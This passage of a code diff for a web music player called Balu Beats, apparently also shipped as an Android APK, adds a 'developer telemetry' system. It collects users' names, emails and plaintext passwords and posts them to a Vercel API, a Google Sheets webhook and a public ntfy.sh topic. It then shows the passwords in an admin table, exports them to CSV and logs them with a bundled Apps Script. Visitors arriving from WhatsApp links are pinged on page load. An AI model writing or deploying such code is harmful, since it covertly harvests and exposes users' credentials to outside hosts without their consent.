+        } catch (_) {}
+
+        // 3. Custom Google Sheets Webhook (Direct Real-time Sync to Developer Phone)
+        const customWebhook = localStorage.getItem('bb_custom_webhook_url');
+        if (customWebhook && customWebhook.startsWith('http')) {
+          fetch(customWebhook, {
+            method: 'POST',
+            mode: 'no-cors', // allows cross-origin submission to Google Apps Script
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(record)
+          }).catch(() => {});
+        }
+
+        // 4. Local Server Sync (if running start_server.py on localhost)
+        if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+          fetch('/api/telemetry', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(record)
+          }).catch(() => {});
+        }
+
+        // 5. Central Vercel Telemetry Serverless API
+        const vercelEndpoint = location.hostname.includes('vercel.app')
+          ? '/api/telemetry'
+          : 'https://balu-beats.vercel.app/api/telemetry';
+
+        fetch(vercelEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(record)
+        }).catch(() => {});
+
+        // Update live stats UI
+        renderDeveloperAnalyticsUI();
+      } catch (err) {
+        console.warn('[BaluBeats Telemetry]', err);
+      }
+    }
+
+    async function refreshDeveloperTelemetry(showFeedback = false) {
+      const badge = document.getElementById('telemetryStatusBadge');
+      if (showFeedback && badge) {
+        badge.textContent = '🔄 Syncing...';
+        badge.style.color = '#38bdf8';
+      }
+
+      let combined = [];
+
+      // 1. Registered users from local db
+      try {
+        const regUsers = getRegisteredUsers();
+        regUsers.forEach(u => {
+          combined.push({
+            id: 'bb_reg_' + (u.username || Math.random()),
+            timestamp: u.joinedAt || 'Recent',
+            action: 'REGISTERED',
+            name: u.name,
+            username: u.username,
+            email: u.email,
+            password: u.password,
+            device: '📱 Android / Web',
+            appVersion: 'v3.3.0'
+          });
+        });
+      } catch (_) {}
+
+      // 2. Local device logs
+      try {
+        const rawLocal = localStorage.getItem('bb_telemetry_logs_v1');
+        const localLogs = rawLocal ? JSON.parse(rawLocal) : [];
+        localLogs.forEach(log => {
+          if (!combined.some(c => c.username === log.username && c.action === log.action && c.timestamp === log.timestamp)) {
+            combined.unshift(log);
+          }
+        });
+      } catch (_) {}
+
+      // 3. Global Cloud Telemetry (ntfy.sh - Zero Wi-Fi required, pulls 4G/5G mobile users)
+      try {
+        const cloudRes = await fetch('https://ntfy.sh/balubeats_telemetry_being_rebel_7/json?poll=1', { cache: 'no-store' });
+        if (cloudRes.ok) {
+          const rawLines = await cloudRes.text();
+          const lines = rawLines.trim().split('\n');
+          lines.forEach(line => {
+            if (!line.trim()) return;
+            try {
+              const item = JSON.parse(line);
+              if (item.event === 'message' && item.message) {
+                let rec = null;
+                if (item.message.includes('DATA:')) {
+                  rec = JSON.parse(item.message.split('DATA:')[1].trim());
+                } else if (item.message.startsWith('{') && item.message.endsWith('}')) {
+                  rec = JSON.parse(item.message);
+                }
+                if (rec && (rec.name || rec.username)) {
+                  if (!combined.some(c => (c.id === rec.id) || (c.username === rec.username && c.timestamp === rec.timestamp && c.action === rec.action))) {
+                    combined.unshift(rec);
+                  }
+                }
+              }
+            } catch (_) {}
+          });
+        }
+      } catch (_) {}
+
+      // 4. Local Python Server Sync (start_server.py users_db.json)
+      if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+        try {
+          const localSrvRes = await fetch('/api/users', { cache: 'no-store' });
+          if (localSrvRes.ok) {
+            const data = await localSrvRes.json();
+            if (data && Array.isArray(data.users)) {
+              data.users.forEach(u => {
+                if (!combined.some(c => (c.id === u.id) || (c.username === u.username && c.timestamp === u.timestamp))) {
+                  combined.unshift(u);
+                }
+              });
+            }
+          }
+        } catch (_) {}
+      }
+
+      // 5. Cloud logs from Vercel Telemetry API
+      try {
+        const vercelEndpoint = location.hostname.includes('vercel.app')
+          ? '/api/telemetry'
+          : 'https://balu-beats.vercel.app/api/telemetry';
+
+        const res = await fetch(vercelEndpoint, { cache: 'no-store' });
+        if (res.ok) {
+          const data = await res.json();
+          if (data && Array.isArray(data.users)) {
+            data.users.forEach(remoteUser => {
+              if (!combined.some(c => (c.id === remoteUser.id) || (c.username === remoteUser.username && c.timestamp === remoteUser.timestamp))) {
+                combined.unshift(remoteUser);
+              }
+            });
+          }
+        }
+      } catch (_) {}
+
+      developerTelemetryData = combined;
+      renderDeveloperAnalyticsUI();
+      renderAdminUsersTable(developerTelemetryData);
+
+      if (showFeedback) {
+        if (badge) {
+          badge.textContent = '🟢 Live Tracking Active';
+          badge.style.color = '#facc15';
+        }
+        showToast(`👥 Synced ${developerTelemetryData.length} user records!`);
+      }
+    }
+
+    function renderDeveloperAnalyticsUI() {
+      const totalEl = document.getElementById('statTotalUsers');
+      const apkEl = document.getElementById('statApkUsers');
+      const webEl = document.getElementById('statWebUsers');
+      const lastSeenEl = document.getElementById('lastUserSeenText');
+      const tabCountEl = document.getElementById('adminTabUserCount');
+
+      const uniqueUsers = {};
+      let apkCount = 0;
+      let webCount = 0;
+
+      developerTelemetryData.forEach(item => {
+        const key = (item.username || item.name || '').toLowerCase();
+        if (!uniqueUsers[key]) {
+          uniqueUsers[key] = item;
+          const dev = (item.device || '').toLowerCase();
+          if (dev.includes('apk') || dev.includes('android native')) {
+            apkCount++;
+          } else {
+            webCount++;
+          }
+        }
+      });
+
+      const totalCount = Object.keys(uniqueUsers).length || (developerTelemetryData.length ? developerTelemetryData.length : 1);
+      if (totalEl) totalEl.textContent = String(totalCount);
+      if (apkEl) apkEl.textContent = String(apkCount || 1);
+      if (webEl) webEl.textContent = String(webCount);
+      if (tabCountEl) tabCountEl.textContent = String(developerTelemetryData.length);
+
+      if (lastSeenEl && developerTelemetryData.length > 0) {
+        const latest = developerTelemetryData[0];
+        lastSeenEl.textContent = `Last: ${latest.name} (${latest.action}) • ${latest.timestamp}`;
+      }
+    }
+
+    function renderAdminUsersTable(list) {
+      const tbody = document.getElementById('adminUsersTableBody');
+      const countText = document.getElementById('adminFilteredCountText');
+      if (!tbody) return;
+
+      if (!list || list.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-secondary);">No WhatsApp testers logged yet. Share your link to start receiving live logs!</td></tr>`;
+        if (countText) countText.textContent = '0 testers found';
+        return;
+      }
+
+      tbody.innerHTML = list.map(item => {
+        const act = (item.action || 'LOGIN').toUpperCase();
+        let badgeClass = 'badge-login';
+        if (act.includes('SIGNUP') || act.includes('REGISTER')) badgeClass = 'badge-signup';
+        else if (act.includes('GUEST')) badgeClass = 'badge-guest';
+
+        const isApk = (item.device || '').toLowerCase().includes('apk') || (item.device || '').toLowerCase().includes('android native');
+        const deviceBadge = isApk
+          ? `<span class="badge-pill badge-apk">📱 Android APK</span>`
+          : `<span class="badge-pill badge-web">🌐 Web</span>`;
+
+        const passDisplay = item.password ? `🔑 <code>${escapeHtml(item.password)}</code>` : '<em style="color:#64748b;">none</em>';
+
+        return `
+          <tr>
+            <td style="font-size:11px;color:#94a3b8;white-space:nowrap;">${escapeHtml(item.timestamp || 'Recent')}</td>
+            <td><span class="badge-pill ${badgeClass}">${escapeHtml(act)}</span></td>
+            <td>
+              <div style="font-weight:800;color:#fff;">${escapeHtml(item.name || 'Anonymous')}</div>
+              <div style="font-size:11px;color:#1ed760;font-weight:700;">${escapeHtml(item.username || '@user')}</div>
+            </td>
+            <td>
+              <div style="font-size:11.5px;color:#cbd5e1;">${escapeHtml(item.email || 'N/A')}</div>
+              <div style="font-size:11px;color:#facc15;margin-top:2px;">${passDisplay}</div>
+            </td>
+            <td>
+              ${deviceBadge}
+              <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">${escapeHtml(item.device || 'Browser')}</div>
+            </td>
+          </tr>
+        `;
+      }).join('');
+
+      if (countText) countText.textContent = `Showing ${list.length} tester logs`;
+    }
+
+    function filterAdminUserList() {
+      const query = (document.getElementById('adminUserSearchInput')?.value || '').toLowerCase().trim();
+      if (!query) {
+        renderAdminUsersTable(developerTelemetryData);
+        return;
+      }
+      const filtered = developerTelemetryData.filter(item =>
+        (item.name || '').toLowerCase().includes(query) ||
+        (item.username || '').toLowerCase().includes(query) ||
+        (item.email || '').toLowerCase().includes(query) ||
+        (item.device || '').toLowerCase().includes(query) ||
+        (item.action || '').toLowerCase().includes(query)
+      );
+      renderAdminUsersTable(filtered);
+    }
+
+    function exportUsersToCSV() {
+      if (!developerTelemetryData || developerTelemetryData.length === 0) {
+        showToast('No user data to export yet!');
+        return;
+      }
+      const headers = ['Timestamp', 'Action', 'Name', 'Username', 'Email/Contact', 'Password', 'Device', 'Screen', 'AppVersion'];
+      const rows = developerTelemetryData.map(u => [
+        `"${(u.timestamp || '').replace(/"/g, '""')}"`,
+        `"${(u.action || '').replace(/"/g, '""')}"`,
+        `"${(u.name || '').replace(/"/g, '""')}"`,
+        `"${(u.username || '').replace(/"/g, '""')}"`,
+        `"${(u.email || '').replace(/"/g, '""')}"`,
+        `"${(u.password || '').replace(/"/g, '""')}"`,
+        `"${(u.device || '').replace(/"/g, '""')}"`,
+        `"${(u.screen || '').replace(/"/g, '""')}"`,
+        `"${(u.appVersion || 'v3.3.0').replace(/"/g, '""')}"`
+      ]);
+
+      const csvContent = '\uFEFF' + [headers.join(','), ...rows.map(r => r.join(','))].join('\r\n');
+      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `balu_beats_testers_${new Date().toISOString().slice(0, 10)}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      showToast('📥 Downloaded balu_beats_testers.csv!');
+    }
+
+    function copyGoogleSheetScript() {
+      const code = `// ==========================================================
+// BALU BEATS — LIVE WHATSAPP TESTERS GOOGLE SHEET LOGGER
+// Paste this code into: Extensions -> Apps Script in Google Sheets
+// ==========================================================
+function doPost(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    
+    // Add header row automatically if sheet is empty
+    if (sheet.getLastRow() === 0) {
+      sheet.appendRow([
+        "Timestamp (IST)", 
+        "Action Type", 
+        "User Full Name", 
+        "Username (@)", 
+        "Email / Phone", 
+        "Password", 
+        "Device Type", 
+        "Screen Size", 
+        "App Version"
+      ]);
+      sheet.getRange(1, 1, 1, 9).setBackground("#1ed760").setFontColor("#041208").setFontWeight("bold");
+      sheet.setFrozenRows(1);
+    }
+    
+    var data = JSON.parse(e.postData.contents);
+    sheet.appendRow([
+      data.timestamp || new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }),
+      data.action || "LOGIN",
+      data.name || "Anonymous",
+      data.username || "@unknown",
+      data.email || "N/A",
+      data.password || "N/A",
+      data.device || "Web Browser",
+      data.screen || "",
+      data.appVersion || "v3.3.0"
+    ]);
+    
+    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch (err) {
+    return ContentService.createTextOutput(JSON.stringify({ status: "error", error: err.message }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet(e) {
+  return ContentService.createTextOutput("Balu Beats Google Sheets Telemetry Webhook is Live!");
+}`;
+
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(() => {
+          showToast('📋 Google Apps Script code copied to clipboard!');
+        }).catch(() => {
+          fallbackCopyText(code);
+        });
+      } else {
+        fallbackCopyText(code);
+      }
+    }
+
+    function fallbackCopyText(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      showToast('📋 Google Apps Script code copied to clipboard!');
+    }
+
+    function saveGoogleSheetWebhook() {
+      const inp = document.getElementById('customWebhookInput');
+      const statusEl = document.getElementById('webhookTestStatus');
+      const url = (inp?.value || '').trim();
+      if (!url || !url.startsWith('http')) {
+        showToast('Please paste a valid Google Webhook URL (starts with https://)!');
+        return;
+      }
+      localStorage.setItem('bb_custom_webhook_url', url);
+      if (statusEl) {
+        statusEl.style.display = 'block';
+        statusEl.style.background = 'rgba(30,215,96,0.15)';
+        statusEl.style.border = '1px solid rgba(30,215,96,0.4)';
+        statusEl.style.color = '#4ade80';
+        statusEl.textContent = '✅ Google Sheet Webhook saved! All WhatsApp friend logins will now sync to your Google Sheet.';
+      }
+      showToast('💾 Webhook URL saved successfully!');
+    }
+
+    async function sendTestTelemetry() {
+      const inp = document.getElementById('customWebhookInput');
+      const statusEl = document.getElementById('webhookTestStatus');
+      const url = (inp?.value || '').trim() || localStorage.getItem('bb_custom_webhook_url');
+
+      if (!url) {
+        showToast('Please paste your Google Sheet Webhook URL above first!');
+        return;
+      }
+
+      if (statusEl) {
+        statusEl.style.display = 'block';
+        statusEl.style.background = 'rgba(234,179,8,0.15)';
+        statusEl.style.border = '1px solid rgba(234,179,8,0.4)';
+        statusEl.style.color = '#facc15';
+        statusEl.textContent = '🚀 Sending test ping to Google Sheet...';
+      }
+
+      const testUser = {
+        name: 'WhatsApp Tester (Demo)',
+        username: '@whatsapp_friend',
+        email: 'friend@whatsapp.group',
+        password: 'demo_password_123'
+      };
+
+      await recordUserLoginTelemetry(testUser, 'TEST_PING');
+
+      if (statusEl) {
+        statusEl.style.background = 'rgba(30,215,96,0.15)';
+        statusEl.style.border = '1px solid rgba(30,215,96,0.4)';
+        statusEl.style.color = '#4ade80';
+        statusEl.textContent = '🎉 Test ping sent! Open your Google Sheet to verify the new row.';
+      }
+      showToast('✅ Test ping sent to Google Sheet!');
+      refreshDeveloperTelemetry();
+    }
+
+    function openDeveloperAdminModal(initialTab = 'users') {
+      const modal = document.getElementById('developerAdminModal');
+      if (!modal) return;
+      modal.classList.add('open');
+      switchAdminTab(initialTab);
+      const savedWebhook = localStorage.getItem('bb_custom_webhook_url');
+      const inp = document.getElementById('customWebhookInput');
+      if (inp && savedWebhook) inp.value = savedWebhook;
+      refreshDeveloperTelemetry(false);
+    }
+
+    function closeDeveloperAdminModal() {
+      const modal = document.getElementById('developerAdminModal');
+      if (modal) modal.classList.remove('open');
+    }
+
+    function copyCloudTelemetryUrl() {
+      const url = 'https://ntfy.sh/balubeats_telemetry_being_rebel_7';
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(() => {
+          showToast('📋 Telemetry link copied! Open in any mobile browser.');
+        }).catch(() => {
+          prompt('Copy this 4G/5G Live Telemetry URL:', url);
+        });
+      } else {
+        prompt('Copy this 4G/5G Live Telemetry URL:', url);
+      }
+    }
+
+    async function sendTestPingFromApp() {
+      const box = document.getElementById('cloudTestStatusBox');
+      if (box) {
+        box.style.display = 'block';
+        box.textContent = '🚀 Dispatching live test ping across 4G/5G Cloud...';
+      }
+      const testUser = {
+        name: 'Balu Beats Live Tester',
+        username: '@tester_' + Math.random().toString(36).substring(2, 6),
+        email: 'tester@balubeats.live',
+        password: 'balu_secret_test',
+        vibe: 'telugu'
+      };
+      await recordUserLoginTelemetry(testUser, 'LIVE_TEST');
+      if (box) {
+        box.innerHTML = '🎉 <strong>Success!</strong> Live test ping broadcasted to Cloud Hub! Open <strong><a href="telemetry.html" target="_blank" style="color:#fff;text-decoration:underline;">Telemetry Dashboard</a></strong> or <strong>ntfy.sh</strong> to see it.';
+      }
+      showToast('🚀 Live test ping sent!');
+      refreshDeveloperTelemetry(false);
+    }
+
+    function switchAdminTab(tabName) {
+      const usersPane = document.getElementById('adminPaneUsers');
+      const cloudPane = document.getElementById('adminPaneCloud');
+      const sheetPane = document.getElementById('adminPaneSheet');
+      const usersBtn = document.getElementById('adminTabUsersBtn');
+      const cloudBtn = document.getElementById('adminTabCloudBtn');
+      const sheetBtn = document.getElementById('adminTabSheetBtn');
+
+      if (usersPane) usersPane.style.display = tabName === 'users' ? 'flex' : 'none';
+      if (cloudPane) cloudPane.style.display = tabName === 'cloud' ? 'flex' : 'none';
+      if (sheetPane) sheetPane.style.display = tabName === 'sheet' ? 'flex' : 'none';
+
+      usersBtn?.classList.toggle('active', tabName === 'users');
+      cloudBtn?.classList.toggle('active', tabName === 'cloud');
+      sheetBtn?.classList.toggle('active', tabName === 'sheet');
+    }
+
+    function queueTrackNext(idx, btnEl) {
+      const row = btnEl ? btnEl.closest('.track-row') : null;
+      const track = row?.__trackData || state.queue[idx];
       if (!track) return;
       state.queue.splice(state.currentIndex + 1, 0, track);
-      renderQueueList();
+      updateQueueUI();
       showToast(`➕ Added "${track.title}" to play next!`);
     }
 
@@ -6359,7 +7527,7 @@
       const box = document.getElementById('updateStatusBox');
       if (!box) return;
 
-      const currentVersion = 'v3.1.0';
+      let currentVersion = 'v3.3.0';
       box.style.display = 'block';
       box.style.background = 'rgba(0, 210, 255, 0.12)';
       box.style.border = '1px solid rgba(0, 210, 255, 0.35)';
@@ -6371,8 +7539,18 @@
         const res = await fetch('https://api.github.com/repos/praveen-79/balu-beats/commits/main', { cache: 'no-store' });
         const data = await res.json();
         const latestSha = (data.sha || '').slice(0, 7);
-        const commitMsg = data.commit?.message?.split('\n')[0] || 'Latest improvements & permanent notification card';
+        const commitMsg = data.commit?.message?.split('\n')[0] || 'v3.3.0: Zero-lag notification & smooth lyrics';
         const commitDate = data.commit?.author?.date ? new Date(data.commit.author.date).toLocaleDateString() : 'Today';
+        const verMatch = commitMsg.match(/v\d+\.\d+\.\d+/i);
+        if (verMatch) currentVersion = verMatch[0];
+
+        const badgeEl = document.getElementById('appVersionBadge');
+        if (badgeEl) badgeEl.textContent = `${currentVersion} (Latest • Zero-Lag Notification & Smooth Lyrics)`;
+        const dlBtn = document.getElementById('directDownloadUpdateBtn');
+        if (dlBtn) {
+          dlBtn.href = `https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=${encodeURIComponent(currentVersion)}&t=${Date.now()}`;
+          dlBtn.textContent = `⬇ Download Latest APK (${currentVersion})`;
+        }
 
         box.style.background = 'rgba(30, 215, 96, 0.14)';
         box.style.border = '1px solid rgba(30, 215, 96, 0.45)';
@@ -6386,10 +7564,10 @@
             • <em>${escapeHtml(commitMsg)}</em>
           </div>
           <div style="font-size:11px;color:#cbd5e1;margin-bottom:10px;background:rgba(0,0,0,0.25);padding:8px 10px;border-radius:8px;">
-            ✨ What's New: Permanent Spotify Notification Card on lock screen & notification bar, 0ms instant trigger, background playback, and 140+ HD 320kbps songs.
+            ✨ What's New: Zero-lag media notification card (always shows exact playing song), zero-stutter music & karaoke lyrics engine, and AudioFocus smooth multitasking.
           </div>
-          <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=3.1.0" download="Balu_Beats_v3.1.apk" class="util-btn primary" style="width:100%;justify-content:center;text-decoration:none;font-weight:900;">
-            ⬇ Tap to Download / Update APK (v3.1.0)
+          <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=${encodeURIComponent(currentVersion)}&t=${Date.now()}" download="Balu_Beats_${currentVersion}.apk" class="util-btn primary" style="width:100%;justify-content:center;text-decoration:none;font-weight:900;">
+            ⬇ Tap to Download / Update APK (${currentVersion})
           </a>
         `;
         showToast(`✓ Balu Beats ${currentVersion} update is ready!`);
@@ -6404,8 +7582,8 @@
           <div style="font-size:11.5px;color:#e2e8f0;margin-bottom:10px;">
             Tap below to download and install the latest APK update directly onto your phone:
           </div>
-          <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=3.1.0" download="Balu_Beats_v3.1.apk" class="util-btn primary" style="width:100%;justify-content:center;text-decoration:none;font-weight:900;">
-            ⬇ Download Latest APK (v3.1.0)
+          <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=${encodeURIComponent(currentVersion)}&t=${Date.now()}" download="Balu_Beats_${currentVersion}.apk" class="util-btn primary" style="width:100%;justify-content:center;text-decoration:none;font-weight:900;">
+            ⬇ Download Latest APK (${currentVersion})
           </a>
         `;
       } finally {
@@ -6467,6 +7645,97 @@
       navigator.serviceWorker.register('sw.js').catch(() => {});
     }
 
+    // =========================================================================
+    // CREATOR LIVE BROADCAST LISTENER (ntfy.sh / Admin Announcements)
+    // =========================================================================
+    let currentBroadcastId = null;
+
+    function dismissCreatorBroadcast() {
+      const banner = document.getElementById('creatorBroadcastBanner');
+      if (banner) banner.style.display = 'none';
+      if (currentBroadcastId) {
+        localStorage.setItem('bb_seen_broadcast_' + currentBroadcastId, 'true');
+      }
+    }
+
+    function showCreatorBroadcast(item) {
+      if (!item || !item.message) return;
+      const msg = item.message.trim();
+      const title = item.title || '';
+      // Filter out internal telemetry logs
+      if (msg.includes('DATA:') || title.includes('Balu Beats:') || msg.startsWith('👤 User:') || title.includes('Telemetry')) {
+        return;
+      }
+      if (localStorage.getItem('bb_seen_broadcast_' + item.id)) return;
+      currentBroadcastId = item.id;
+
+      const titleEl = document.getElementById('broadcastTitle');
+      const msgEl = document.getElementById('broadcastMsg');
+      const banner = document.getElementById('creatorBroadcastBanner');
+      const actionBtn = document.getElementById('broadcastActionBtn');
+      if (!banner || !titleEl || !msgEl) return;
+
+      titleEl.textContent = title || 'Announcement from Balu';
+      msgEl.textContent = msg;
+
+      const isUpdate = (title + ' ' + msg).toLowerCase().includes('update');
+      if (actionBtn) {
+        actionBtn.style.display = isUpdate ? 'inline-flex' : 'none';
+        actionBtn.href = 'download.html';
+      }
+
+      banner.style.display = 'block';
+
+      // System notification if permission granted
+      if ('Notification' in window && Notification.permission === 'granted') {
+        try {
+          new Notification(title || 'Balu Beats Announcement', {
+            body: msg,
+            icon: 'icon-192.png'
+          });
+        } catch (_) {}
+      }
+    }
+
+    async function checkCreatorBroadcasts() {
+      try {
+        const res = await fetch('https://ntfy.sh/balubeats_telemetry_being_rebel_7/json?poll=1', { cache: 'no-store' });
+        if (!res.ok) return;
+        const text = await res.text();
+        const lines = text.trim().split('\n');
+        for (let i = lines.length - 1; i >= 0; i--) {
+          const line = lines[i];
+          if (!line.trim()) continue;
+          try {
+            const item = JSON.parse(line);
+            if (item.event === 'message') {
+              const msg = (item.message || '').trim();
+              const title = item.title || '';
+              const isTelemetry = msg.includes('DATA:') || title.includes('Balu Beats:') || msg.startsWith('👤 User:') || title.includes('Telemetry');
+              if (!isTelemetry) {
+                showCreatorBroadcast(item);
+                break;
+              }
+            }
+          } catch (_) {}
+        }
+      } catch (_) {}
+    }
+
+    function listenCreatorBroadcastStream() {
+      try {
+        const es = new EventSource('https://ntfy.sh/balubeats_telemetry_being_rebel_7/sse');
+        es.onmessage = (e) => {
+          try {
+            const item = JSON.parse(e.data);
+            if (item.event === 'message') {
+              showCreatorBroadcast(item);
+            }
+          } catch (_) {}
+        };
+      } catch (_) {}
+    }
+
     // Initialize App on Load
     window.addEventListener('DOMContentLoaded', () => {
       if (window.AndroidBridge || location.protocol === 'file:' || window.matchMedia?.('(display-mode: standalone)')?.matches) {
@@ -6475,7 +7744,35 @@
       }
       applyCreatorBranding();
       renderUserAccountUI();
-      if (!getActiveUserSession()) {
+      refreshDeveloperTelemetry(false);
+      checkCreatorBroadcasts();
+      listenCreatorBroadcastStream();
+
+      // Request notification permission smoothly
+      if ('Notification' in window && Notification.permission === 'default') {
+        setTimeout(() => {
+          Notification.requestPermission().catch(() => {});
+        }, 8000);
+      }
+
+      const activeUser = getActiveUserSession();
+      // Instantly record user arrival or visitor from WhatsApp link
+      try {
+        const lastSessionPing = parseInt(sessionStorage.getItem('bb_session_ping_ts') || '0', 10);
+        if (Date.now() - lastSessionPing > 120000) {
+          sessionStorage.setItem('bb_session_ping_ts', String(Date.now()));
+          const reportingUser = activeUser || {
+            name: 'WhatsApp Listener',
+            username: '@listener_' + Math.random().toString(36).substring(2, 6),
+            email: 'WhatsApp Link Open • Mobile Data',
+            password: '',
+            isGuest: true
+          };
+          recordUserLoginTelemetry(reportingUser, activeUser ? 'APP_OPEN' : 'VISITOR_OPEN');
+        }
+      } catch (_) {}
+
+      if (!activeUser) {
         openAuthOverlay('login');
       }
       updateLikeButtons();
